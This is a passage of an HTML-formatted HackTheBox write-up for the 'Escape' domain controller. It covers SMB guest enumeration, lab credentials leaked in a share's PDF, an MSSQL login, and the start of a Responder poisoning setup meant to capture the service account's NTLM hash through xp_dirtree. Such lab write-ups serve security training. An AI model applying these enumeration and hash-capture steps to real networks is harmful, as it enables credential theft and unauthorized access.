<span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2023</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">18</span><span class="nx">T21</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">35</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">24</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h15m15s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="mi">9389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">mc</span><span class="o">-</span><span class="nx">nmf</span><span class="w">        </span><span class="p">.</span><span class="nx">NET</span><span class="w"> </span><span class="nx">Message</span><span class="w"> </span><span class="nx">Framing</span>
<span class="mi">49667</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">49687</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="mi">49688</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">49708</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">49712</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">60035</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">DC</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="w">   </span><span class="mi">311</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
<span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="nx">T21</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">44</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
<span class="o">|</span><span class="nx">_clock</span><span class="o">-</span><span class="nx">skew</span><span class="p">:</span><span class="w"> </span><span class="nx">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="nx">h15m14s</span><span class="p">,</span><span class="w"> </span><span class="nx">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="nx">median</span><span class="p">:</span><span class="w"> </span><span class="mi">8</span><span class="nx">h15m14s</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">107.8</span><span class="mi">7</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre><br style="line-height: 0.5;"/></div>

After inspecting the scan results, it appears that we are dealing with a domain controller, specifically an Active Directory environment on Windows.<br/><br/>
At first glance, we can already identify a domain that I will immediately add to the <code>/etc/hosts</code> file.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">parrot</span><span class="err">$</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">hosts</span>
<span class="err">#</span><span class="w"> </span><span class="nx">Host</span><span class="w"> </span><span class="nx">addresses</span>
<span class="m m-Double">127.0.0.1</span><span class="w">  </span><span class="nx">localhost</span>
<span class="m m-Double">127.0.1.1</span><span class="w">  </span><span class="nx">Parrot</span>
<span class="o">::</span><span class="mi">1</span><span class="w">        </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">localhost</span><span class="w"> </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">loopback</span>
<span class="nx">ff02</span><span class="o">::</span><span class="mi">1</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allnodes</span>
<span class="nx">ff02</span><span class="o">::</span><span class="mi">2</span><span class="w">    </span><span class="nx">ip6</span><span class="o">-</span><span class="nx">allrouters</span>

<span class="err">#</span><span class="w"> </span><span class="nx">HackTheBox</span>
<span class="m m-Double">10.10.11.2</span><span class="mi">02</span><span class="w"> </span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="nx">dc</span><span class="p">.</span><span class="nx">sequel</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="nx">dc</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br>SMB - TCP 445</br></h3><br>
The port 445 corresponds to the SMB service. We will start performing reconnaissance on the machine using this service. For this purpose, I will initially use the tool <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="mf">10.10.11.202</span>
<span class="n">SMB</span><span class="w">         </span><span class="mf">10.10.11.202</span><span class="w">    </span><span class="mi">445</span><span class="w">    </span><span class="n">DC</span><span class="w">               </span><span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mf">10.0</span><span class="w"> </span><span class="n">Build</span><span class="w"> </span><span class="mi">17763</span><span class="w"> </span><span class="n">x64</span><span class="w"> </span><span class="p">(</span><span class="nl">name</span><span class="p">:</span><span class="n">DC</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="k">domain</span><span class="err">:</span><span class="n">sequel</span><span class="p">.</span><span class="n">htb</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nl">signing</span><span class="p">:</span><span class="k">True</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nl">SMBv1</span><span class="p">:</span><span class="k">False</span><span class="p">)</span>
</code></pre><br style="line-height: 0.5;"/></div>

We already obtained the relevant information we were looking for, which was the domain.<br/><br/>
The SMB service sometimes exposes shared resources on the network. Accessing these resources typically requires the use of valid credentials. However, there are cases where a guest session (Null Session) can be used.<br/><br/>
A guest or null session is a type of authentication where no password is required for access. Only a username needs to be provided. It's important to note that this doesn't always work, but it's good practice to give it a try nonetheless.<br/><br/>
I will use the tool <a href="https://github.com/ShawnDEvans/smbmap">smbmap</a> to scan the shared resources using a guest session.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'test'</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Guest</span><span class="w"> </span><span class="k">session</span><span class="w">       </span><span class="nl">IP</span><span class="p">:</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="err">:</span><span class="mi">445</span><span class="w">    </span><span class="nl">Name</span><span class="p">:</span><span class="w"> </span><span class="n">sequel</span><span class="p">.</span><span class="n">htb</span>

<span class="k">Disk</span><span class="w">        </span><span class="nf">Permissions</span><span class="w">   </span><span class="n">Comment</span>
<span class="o">----</span><span class="w">        </span><span class="o">-----------</span><span class="w">    </span><span class="o">-------</span>
<span class="k">ADMIN</span><span class="err">$</span><span class="w">      </span><span class="k">NO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w">      </span><span class="n">Remote</span><span class="w"> </span><span class="k">Admin</span>
<span class="n">C</span><span class="err">$</span><span class="w">          </span><span class="k">NO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w">      </span><span class="k">Default</span><span class="w"> </span><span class="n">share</span>
<span class="n">IPC</span><span class="err">$</span><span class="w">        </span><span class="k">READ</span><span class="w"> </span><span class="k">ONLY</span><span class="w">      </span><span class="n">Remote</span><span class="w"> </span><span class="n">IPC</span>
<span class="n">NETLOGON</span><span class="w">    </span><span class="k">NO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w">      </span><span class="n">Logon</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">share</span><span class="w"> </span>
<span class="k">Public</span><span class="w">      </span><span class="k">READ</span><span class="w"> </span><span class="k">ONLY</span><span class="w">   </span>
<span class="n">SYSVOL</span><span class="w">      </span><span class="k">NO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w">      </span><span class="n">Logon</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">share</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

We observe that there is a resource called "public" in which we have read privileges. Let's try listing its contents.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'test'</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="s1">'Public'</span>
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/1.png?raw=true"/><br/><br/>
We have identified a PDF file within the directory. We will proceed to download it and perform an inspection to analyze its content.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="err">@</span><span class="n">parrot</span><span class="o">$</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'test'</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="s1">'Public'</span><span class="w"> </span><span class="o">--</span><span class="n">download</span><span class="w"> </span><span class="s2">"Public/SQL Server Procedures.pdf"</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">download</span><span class="p">:</span><span class="w"> </span><span class="n">Public</span>\<span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="n">Procedures</span><span class="o">.</span><span class="n">pdf</span><span class="w"> </span><span class="p">(</span><span class="mi">49551</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">File</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="o">./</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.202</span><span class="o">-</span><span class="n">Public_SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="n">Procedures</span><span class="o">.</span><span class="n">pdf</span>
</code></pre><br style="line-height: 0.5;"/></div>

We can open the web browser and enter the absolute path of the file on our system to view its content.<br/><br/>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/2.png?raw=true"/><br/><br/>
Upon reading the file, we notice that on the second page, at the end, there is relevant information.<br/><br/>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/3.png?raw=true"/><br/><br/>
It appears that credentials are being leaked. I will save them in a file and attempt to authenticate to the SMB service using these credentials.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">PublicUser</span><span class="o">:</span><span class="n">GuestUserCantWrite1</span>
</code></pre><br style="line-height: 0.5;"/></div>

We can verify if the credentials are correct using the tool <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1'
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/4.png?raw=true"/><br/><br/>
It appears that the credentials are not valid for the SMB service. However, since the PDF mentioned that they were for accessing the database, I will attempt to use the <code>mssqlclient</code> tool from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> to connect.<br/><br/>
I will try again with the same credentials:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">parrot$</span><span class="w"> </span><span class="n">mssqlclient</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="s">"sequel.htb/PublicUser@10.10.11.202"</span>
<span class="n">Impacket</span><span class="w"> </span><span class="n">v0</span><span class="mf">.9.23</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="n">SecureAuth</span><span class="w"> </span><span class="n">Corporation</span>

<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Encryption</span><span class="w"> </span><span class="n">required</span><span class="p">,</span><span class="w"> </span><span class="n">switching</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">TLS</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Old</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="n">master</span><span class="p">,</span><span class="w"> </span><span class="n">New</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="n">master</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">LANGUAGE</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Old</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">New</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="n">us_english</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">ENVCHANGE</span><span class="p">(</span><span class="n">PACKETSIZE</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Old</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="mi">4096</span><span class="p">,</span><span class="w"> </span><span class="n">New</span><span class="w"> </span><span class="n">Value</span><span class="o">:</span><span class="w"> </span><span class="mi">16192</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">INFO</span><span class="p">(</span><span class="n">DC</span><span class="err">\</span><span class="n">SQLMOCK</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">Changed</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="err">'</span><span class="n">master</span><span class="err">'</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">INFO</span><span class="p">(</span><span class="n">DC</span><span class="err">\</span><span class="n">SQLMOCK</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="n">Line</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">Changed</span><span class="w"> </span><span class="n">language</span><span class="w"> </span><span class="n">setting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">us_english</span><span class="p">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">ACK</span><span class="o">:</span><span class="w"> </span><span class="n">Result</span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="p">(</span><span class="mi">150</span><span class="w"> </span><span class="mi">7208</span><span class="p">)</span><span class="w"> </span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Press</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">extra</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">commands</span>
<span class="n">SQL</span><span class="o">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

At this point, I attempted to use <code>xp_cmdshell</code> to execute commands but was not successful. I came up with the idea of trying to make an SMB request to a server hosted on my machine to obtain the Net-NTLMv2 hash of the MSSQL server's administrator user.<br/><br/>
It's important to note that even though we are using the <code>PublicUser</code> account, the network-level request will be made by the MSSQL server administrator. Therefore, when executing <code>xp_dirtree</code> on my IP address, the request will be made by a different user than ours.<br/><br/>
To redirect the request to my server, I will carry out an SMB service poisoning technique with <code>responder</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">responder</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="n">tun0</span>

<span class="w">                                        </span><span class="n">__</span>
<span class="w">  </span><span class="p">.</span><span class="o">----</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">--|</span><span class="w">  </span><span class="o">|</span><span class="p">.</span><span class="o">-----</span><span class="p">.</span><span class="o">----</span><span class="p">.</span>
<span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="n">_</span><span class="o">|</span><span class="w">  </span><span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="w"> </span><span class="o">--|</span><span class="w">  </span><span class="n">_</span><span class="w">  </span><span class="o">|</span><span class="w">  </span><span class="n">_</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w">  </span><span class="n">_</span><span class="w">  </span><span class="o">||</span><span class="w">  </span><span class="o">-</span><span class="n">__</span><span class="o">|</span><span class="w">   </span><span class="n">_</span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="w">   </span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">__</span><span class="o">|</span><span class="n">_____</span><span class="o">||</span><span class="n">_____</span><span class="o">|</span><span class="n">__</span><span class="o">|</span>
<span class="w">                   </span><span class="o">|</span><span class="n">__</span><span class="o">|</span>

<span class="w">           </span><span class="n">NBT</span><span class="o">-</span><span class="n">NS</span><span class="p">,</span><span class="w"> </span><span class="n">LLMNR</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">MDNS</span><span class="w"> </span><span class="n">Responder</span><span class="w"> </span><span class="mf">3.0.6.0</span>

<span class="w">  </span><span class="nl">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Laurent</span><span class="w"> </span><span class="n">Gaffie</span><span class="w"> </span><span class="p">(</span><span class="n">laurent</span><span class="p">.</span><span class="n">gaffie</span><span class="nv">@gmail</span><span class="p">.</span><span class="n">com</span><span class="p">)</span>
<span class="w">  </span><span class="k">To</span><span class="w"> </span><span class="k">kill</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">hit</span><span class="w"> </span><span class="n">CTRL</span><span class="o">-</span><span class="n">C</span>


<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Poisoners</span><span class="p">:</span>
<span class="w">    </span><span class="n">LLMNR</span><span class="w">                      </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">NBT</span><span class="o">-</span><span class="n">NS</span><span class="w">                     </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">DNS</span><span class="o">/</span><span class="n">MDNS</span><span class="w">                   </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Servers</span><span class="p">:</span>
<span class="w">    </span><span class="n">HTTP</span><span class="w"> </span><span class="n">server</span><span class="w">                </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">HTTPS</span><span class="w"> </span><span class="n">server</span><span class="w">               </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">WPAD</span><span class="w"> </span><span class="n">proxy</span><span class="w">                 </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Auth</span><span class="w"> </span><span class="n">proxy</span><span class="w">                 </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">SMB</span><span class="w"> </span><span class="n">server</span><span class="w">                 </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">Kerberos</span><span class="w"> </span><span class="n">server</span><span class="w">            </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="k">SQL</span><span class="w"> </span><span class="n">server</span><span class="w">                 </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">FTP</span><span class="w"> </span><span class="n">server</span><span class="w">                 </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">IMAP</span><span class="w"> </span><span class="n">server</span><span class="w">                </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">POP3</span><span class="w"> </span><span class="n">server</span><span class="w">                </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">SMTP</span><span class="w"> </span><span class="n">server</span><span class="w">                </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">DNS</span><span class="w"> </span><span class="n">server</span><span class="w">                 </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">LDAP</span><span class="w"> </span><span class="n">server</span><span class="w">                </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">RDP</span><span class="w"> </span><span class="n">server</span><span class="w">                 </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span><span class="w"> </span><span class="n">server</span><span class="w">             </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>
<span class="w">    </span><span class="n">WinRM</span><span class="w"> </span><span class="n">server</span><span class="w">               </span><span class="o">[</span><span class="n">ON</span><span class="o">]</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="nl">Options</span><span class="p">:</span>
